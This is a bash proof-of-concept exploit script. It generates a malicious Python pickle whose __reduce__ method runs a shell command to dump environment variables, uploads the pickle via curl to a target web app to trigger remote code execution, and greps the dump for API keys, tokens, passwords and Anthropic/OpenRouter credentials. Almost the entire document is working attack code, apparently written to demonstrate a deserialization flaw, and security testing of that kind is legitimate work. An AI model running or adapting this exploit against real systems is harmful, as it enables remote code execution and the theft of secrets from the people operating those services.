#!/bin/bash

# POC: Environment Variable Extraction via Pickle Deserialization RCE
# This POC demonstrates how an attacker can extract sensitive environment variables
# (including API keys) through the pickle deserialization vulnerability

set -e

TARGET_URL="${1:-http://localhost:8080}"
OUTPUT_FILE="/tmp/env_vars_$(date +%s).txt"

echo "[*] Environment Variable Extraction POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Output File: $OUTPUT_FILE"
echo ""

# Create a Python script that generates the malicious pickle payload
PAYLOAD_SCRIPT=$(mktemp)
cat > "$PAYLOAD_SCRIPT" << 'EOF'
import pickle
import subprocess
import sys
import base64
import os

output_file = sys.argv[1]

class Exploit:
    def __reduce__(self):
        # Execute env command and redirect to file
        cmd = f'env > {output_file} 2>&1'
        return (subprocess.Popen, (['bash', '-c', cmd],))

# Create and serialize the exploit object
payload = pickle.dumps(Exploit())

# Save to file for upload
with open('/tmp/exploit.pkl', 'wb') as f:
    f.write(payload)

print("[+] Payload generated successfully")
print(f"[+] Payload size: {len(payload)} bytes")
sys.exit(0)
EOF

# Generate the malicious pickle
echo "[*] Generating malicious pickle payload..."
python3 "$PAYLOAD_SCRIPT" "$OUTPUT_FILE"

if [ ! -f /tmp/exploit.pkl ]; then
    echo "[-] Failed to generate payload"
    rm -f "$PAYLOAD_SCRIPT"
    exit 1
fi

echo "[+] Payload file created at /tmp/exploit.pkl"
echo ""

# Upload the pickle file to trigger RCE
echo "[*] Uploading pickle file to trigger RCE..."
RESPONSE=$(curl -s -F "pickle_file=@/tmp/exploit.pkl" "$TARGET_URL/" 2>&1)

echo "[*] Response from server:"
echo "$RESPONSE"
echo ""

# Wait a moment for command to execute
sleep 1

# Check if environment variables were extracted
if [ -f "$OUTPUT_FILE" ]; then
    echo "[+] SUCCESS! Environment variables extracted to: $OUTPUT_FILE"
    echo ""
    echo "[+] Environment Variables Extracted:"
    echo "=================================================="
    cat "$OUTPUT_FILE"
    echo "=================================================="
    echo ""
    
    # Check for API keys
    echo "[*] Searching for sensitive information (API keys, tokens)..."
    FOUND_SECRETS=0
    
    if grep -q "API_KEY\|api_key\|TOKEN\|token\|SECRET\|secret\|PASSWORD\|password" "$OUTPUT_FILE" 2>/dev/null; then
        echo "[!] SENSITIVE DATA FOUND!"
        grep -E "API_KEY|api_key|TOKEN|token|SECRET|secret|PASSWORD|password" "$OUTPUT_FILE" || true
        FOUND_SECRETS=1
    fi
    
    if grep -q "ANTHROPIC\|OPENROUTER\|sk-ant\|sk-" "$OUTPUT_FILE" 2>/dev/null; then
        echo "[!] ANTHROPIC/OPENROUTER CREDENTIALS DETECTED!"
        grep -E "ANTHROPIC|OPENROUTER|sk-ant|sk-" "$OUTPUT_FILE" || true
        FOUND_SECRETS=1
    fi
    
    if [ $FOUND_SECRETS -eq 1 ]; then
        echo ""
        echo "[!] CRITICAL: API keys and sensitive credentials exposed!"
    fi
    
    echo ""
    echo "[+] POC completed successfully - Environment variables extracted and exfiltrated"
    
    # Cleanup
    rm -f "$PAYLOAD_SCRIPT" /tmp/exploit.pkl
    
    exit 0
else
    echo "[-] FAILED: Environment variables file not created"
    echo "[-] The RCE may have failed or the application may be handling it differently"
    echo ""
    echo "[*] Checking if output file exists in temporary location..."
    ls -la /tmp/env_vars_* 2>/dev/null || echo "[-] No env files found"
    
    # Cleanup
    rm -f "$PAYLOAD_SCRIPT" /tmp/exploit.pkl
    
    exit 1
fi